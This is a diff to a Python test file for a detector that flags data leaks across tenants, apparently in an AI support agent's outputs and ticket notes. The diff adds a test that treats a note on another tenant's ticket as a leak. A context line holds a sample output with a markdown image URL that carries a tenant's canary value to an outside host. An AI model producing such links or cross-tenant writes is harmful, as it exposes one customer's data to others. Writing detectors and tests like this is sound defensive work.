@@ -158,3 +158,9 @@ def test_detector_flags_own_canary_in_external_url_and_cross_tenant_note():
     events = [{"channel": "final_output", "content": "![x](https://elsewhere.example/p?d=ACME-7F3A9C)"}]
     leaks = detect(_registry(), "acme", events, [], [{"ticket_tenant": "initech", "body": "copied ACME-7F3A9C"}])
     assert {l.channel for l in leaks} == {"external_url", "cross_tenant_write"}
+
+
+def test_note_on_another_tenants_ticket_is_a_leak_without_a_canary():
+    note = {"tenant_id": "globex", "ticket_tenant": "globex", "body": "please call the customer back"}
+    assert detect(_registry(), "acme", [], [], [note]) == [Leak("cross_tenant_write", "provenance:note", "acme", "globex")]
+    assert detect(_registry(), "globex", [], [], [note]) == []
